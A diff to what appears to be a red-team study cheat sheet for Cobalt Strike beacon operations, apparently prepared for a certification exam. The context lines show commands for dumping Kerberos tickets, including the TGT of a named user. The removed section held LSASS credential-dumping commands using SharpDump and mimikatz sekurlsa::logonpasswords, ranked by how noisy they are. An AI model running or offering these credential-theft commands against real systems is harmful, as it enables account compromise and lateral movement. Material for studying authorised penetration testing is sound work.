@@ -207,15 +207,6 @@ beacon> krb_triage                              // list all cached tickets
 beacon> krb_dump /user:rsteel /service:krbtgt   // dump specific TGT
 ```
 
-#### LSASS Dump — OPSEC Ladder (least to most noisy)
-```cs
-// Tier 1 — OPSEC-🟠CAUTION: execute-assembly (spawns process)
-beacon> execute-assembly C:\Tools\SharpDump\SharpDump\bin\Release\SharpDump.exe
-
-// Tier 2 — OPSEC-🔴UNSAFE: sekurlsa::logonpasswords (mimikatz direct — NEVER use in exam)
-beacon> mimikatz sekurlsa::logonpasswords
-```
-
 ### Phase 5 — Lateral Movement
 
 ```cs
@@ -398,7 +389,6 @@ Tier:
 🟢SAFE
 🟠CAUTION
 🔴UNSAFE
-
 
 OPSEC PRE-CHECK: <technique name>
 ─────────────────────────────────────────────────
